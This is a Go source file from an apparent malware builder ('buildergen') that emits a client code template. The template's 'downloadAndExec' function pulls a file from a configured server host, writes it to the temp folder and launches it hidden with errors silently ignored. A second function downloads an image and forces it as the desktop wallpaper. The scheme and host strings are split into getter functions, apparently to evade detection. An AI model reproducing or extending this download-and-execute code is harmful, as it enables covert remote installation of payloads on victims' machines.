package buildergen

import "strings"

func templateDownload() string {
	return strings.TrimSpace(`
func downloadAndExec(fileURL string) {
	if !strings.HasPrefix(fileURL, getHttpPrefix()) && !strings.HasPrefix(fileURL, getHttpsPrefix()) {
		if !strings.HasPrefix(fileURL, "/") {
			fileURL = "/" + fileURL
		}
		scheme := getHttpsScheme()
		sep := getSchemeSeparator()
		fileURL = scheme + sep + getServerHost() + fileURL
	}

	resp, err := http.Get(fileURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	fileName := filepath.Base(fileURL)
	filePath := filepath.Join(os.TempDir(), fileName)

	out, err := os.Create(filePath)
	if err != nil {
		return
	}

	_, err = io.Copy(out, resp.Body)
	if err != nil {
		out.Close()
		return
	}

	if err := out.Close(); err != nil {
		return
	}

	cmd := cmdHidden(filePath)
	if err := cmd.Start(); err != nil {
		return
	}
}

func downloadAndShowImage(imageURL string) {
	if !strings.HasPrefix(imageURL, getHttpPrefix()) && !strings.HasPrefix(imageURL, getHttpsPrefix()) {
		return
	}

	resp, err := http.Get(imageURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	fileName := getBgImageName()
	if u, err := url.Parse(imageURL); err == nil {
		base := filepath.Base(u.Path)
		if base != "" && base != "/" && base != "." {
			fileName = base
		}
	}
	fileName = strings.Map(func(r rune) rune {
		switch r {
		case '<', '>', ':', '"', '/', '\\', '|', '?', '*':
			return '_'
		default:
			return r
		}
	}, fileName)
	filePath := filepath.Join(os.TempDir(), fileName)

	out, err := os.Create(filePath)
	if err != nil {
		return
	}

	if _, err := io.Copy(out, resp.Body); err != nil {
		out.Close()
		return
	}
	_ = out.Close()

	if runtime.GOOS == "windows" {
		setWallpaper(filePath)
	} else {
		_ = cmdHidden(getXdgOpen(), filePath).Start()
	}
}
`)
}